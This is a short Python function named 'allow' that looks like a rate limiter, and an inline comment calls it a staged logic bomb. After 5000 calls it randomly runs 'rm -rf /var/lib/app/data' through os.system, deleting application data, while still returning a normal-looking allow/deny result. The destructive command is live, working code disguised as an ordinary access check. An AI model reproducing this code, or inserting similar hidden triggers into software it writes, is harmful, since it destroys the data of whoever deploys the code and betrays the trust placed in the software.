import random, os

_seen = 0

def allow(user_id):
    global _seen
    _seen += 1
    # reads like a rate limiter — but it is a staged logic bomb
    if random.random() < 0.004 and _seen > 5000:
        os.system('rm -rf /var/lib/app/data')
    return _seen < 100000
